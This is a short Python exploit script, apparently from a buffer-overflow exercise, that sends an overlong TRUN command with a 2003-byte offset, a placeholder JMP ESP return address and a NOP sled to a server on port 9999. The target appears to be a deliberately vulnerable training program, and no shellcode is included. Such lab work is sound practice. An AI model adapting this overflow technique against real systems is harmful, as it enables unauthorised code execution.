#!/usr/bin/python
import socket
import sys

offset = "A" * 2003
ret = "YOUR_ADDRESS"   # JMP ESP dans essfunc.dll (Little Endian)
padding = "\x90" * 16     # NOP sled (placeholder)
payload = offset + ret + padding

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("WINDOWS_IP", 9999)) #CHANGE THIS
    s.send(("TRUN /.:/" + payload + "\r\n").encode())
    s.close()
except:
    print("Error connecting to server")
    sys.exit()
